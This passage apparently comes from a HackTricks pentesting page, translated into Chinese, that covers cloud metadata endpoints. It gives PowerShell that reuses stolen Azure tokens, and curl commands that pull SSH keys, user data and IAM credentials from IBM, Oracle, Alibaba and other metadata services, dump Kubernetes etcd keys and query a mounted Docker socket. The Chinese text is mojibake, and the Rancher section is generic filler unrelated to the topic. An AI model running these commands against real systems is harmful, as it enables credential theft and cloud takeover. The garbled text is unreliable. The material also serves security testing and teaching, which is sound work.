$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
+ CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œåœ¨IBMäº‘ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ç¦ç”¨å…ƒæ•°æ®çš„ï¼Œå› æ­¤å³ä½¿æ‚¨åœ¨IBMäº‘è™šæ‹Ÿæœºå†…éƒ¨ï¼Œä¹Ÿå¯èƒ½æ— æ³•è®¿é—®å®ƒã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
-H "Metadata-Flavor: ibm"\
-H "Accept: application/json"\
-d '{
"expires_in": 3600
}' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

æ–‡æ¡£å¯åœ¨[`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)æ‰¾åˆ°ã€‚

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

ï¼ˆæ˜¯å¦éœ€è¦å¤´éƒ¨ï¼ŸæœªçŸ¥ï¼‰
```
http://169.254.169.254/openstack
```
## HP Helion <a href="#a8e0" id="a8e0"></a>

(æ˜¯å¦éœ€è¦æ ‡é¢˜ï¼ŸæœªçŸ¥)
```
http://169.254.169.254/2009-04-04/meta-data/
```
## Oracle Cloud <a href="#a723" id="a723"></a>

## Oracleäº‘ <a href="#a723" id="a723"></a>
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```
## é˜¿é‡Œå·´å·´ <a href="#51bd" id="51bd"></a>
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```
## Kubernetes ETCD <a href="#c80a" id="c80a"></a>

å¯ä»¥åŒ…å«APIå¯†é’¥ã€å†…éƒ¨IPå’Œç«¯å£
```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```
## Docker <a href="#ac0b" id="ac0b"></a>
```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```
## Rancher <a href="#8cb7" id="8cb7"></a>

Rancher is a popular open-source container management platform that allows users to easily deploy and manage containers in a Kubernetes cluster. It provides a user-friendly interface and powerful features for managing containerized applications.

Rancher supports various cloud providers, including AWS, GCP, and Azure, allowing users to deploy their applications on different cloud platforms. It also supports on-premises deployments, making it a versatile choice for managing containers in different environments.

With Rancher, users can easily create and manage Kubernetes clusters, deploy applications, and monitor their performance. It provides a centralized dashboard that allows users to view and manage all their clusters and applications in one place.

One of the key features of Rancher is its ability to integrate with external services and tools. It supports integration with popular monitoring and logging tools, allowing users to easily monitor and analyze the performance of their applications. It also supports integration with CI/CD tools, making it easy to automate the deployment process.

Overall, Rancher is a powerful and flexible container management platform that simplifies the deployment and management of containerized applications. Whether you are running your applications on the cloud or on-premises, Rancher provides the tools and features you need to effectively manage your containers.
```
curl http://rancher-metadata/<version>/<path>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–è€… **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
